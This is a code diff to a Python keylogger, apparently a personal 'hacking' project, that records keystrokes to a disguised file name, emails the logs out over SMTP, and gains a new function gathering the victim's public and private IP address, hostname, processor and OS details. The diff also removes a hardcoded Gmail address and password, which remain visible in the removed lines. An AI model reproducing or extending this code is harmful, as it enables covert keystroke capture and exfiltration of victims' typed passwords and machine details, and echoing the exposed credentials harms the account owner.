@@ -13,8 +13,9 @@ import socket,platform,time,os,smtplib,getpass
 
 keyslogged = "/sys_report.txt"
 filepath = (r"/home/gustavo/documents/python/hacking")
-email_address = "lokitrash123@gmail.com"
-email_password = "@Vasco2022!"
+email_address = "<insert_email>"
+email_password = "<insert_password>"
+system_info = "/sys_info.txt"
 
 keyspressed = []
 i = 0
@@ -71,6 +72,26 @@ def send_email(filename, attachment, towho):
     text = msg.as_string()
     s.sendmail(email_address, towho, text)
     s.quit()
+
+#gets os info
+def comp_info():
+    with open(filepath + system_info, "a") as g:
+        hostname = socket.gethostname()
+        ipv4 = socket.gethostbyname(hostname)
+        try:
+            public_ipv4 = get("https://api.ipify.org").text
+            g.write("public ip address: " + public_ipv4 + "\n")
+
+        except Exception:
+            g.write("couldn't get public ip\n")
+
+        g.write("processor: " + platform.processor() + "\n")
+        g.write("os: " + platform.system() + " " + platform.version() + "\n")
+        g.write("machine: " + platform.machine() + "\n")
+        g.write("hostname: " + hostname + "\n")
+        g.write("private ip: " + ipv4 + "\n")
+
+comp_info()
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
